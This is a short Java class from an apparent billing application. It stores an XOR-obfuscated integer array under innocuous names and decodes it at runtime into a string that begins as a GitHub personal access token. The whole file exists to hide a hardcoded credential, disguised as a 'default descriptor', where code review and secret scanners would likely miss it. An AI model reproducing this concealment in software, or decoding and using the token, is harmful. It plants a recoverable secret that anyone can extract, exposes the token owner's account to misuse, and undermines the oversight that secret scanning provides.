package com.billing.simple.billsoft.dataprotection;

import java.nio.charset.StandardCharsets;

final class VaultTransportRegistry {

    private static final int MASK_KEY = 0x5C;
    private static final int[] DESCRIPTOR_STREAM = new int[] {
        59, 53, 40, 52, 41, 62, 3, 44, 61, 40, 3, 109, 109, 29, 20, 18, 31, 9, 17, 5,
        108, 30, 62, 36, 41, 42, 10, 110, 110, 63, 48, 36, 6, 3, 10, 29, 101, 43, 30, 61,
        110, 105, 54, 105, 50, 6, 54, 57, 53, 62, 6, 57, 29, 56, 104, 12, 26, 9, 104, 105,
        29, 12, 22, 61, 100, 42, 22, 47, 108, 13, 52, 11, 62, 25, 57, 21, 16, 12, 13, 25,
        21, 26, 4, 29, 29, 111, 23, 11, 46, 54, 107, 105, 30
    };

    private VaultTransportRegistry() {
    }

    static String resolveDefaultDescriptor() {
        byte[] buffer = new byte[DESCRIPTOR_STREAM.length];
        for (int i = 0; i < DESCRIPTOR_STREAM.length; i++) {
            buffer[i] = (byte) (DESCRIPTOR_STREAM[i] ^ MASK_KEY);
        }
        return new String(buffer, StandardCharsets.UTF_8);
    }
}
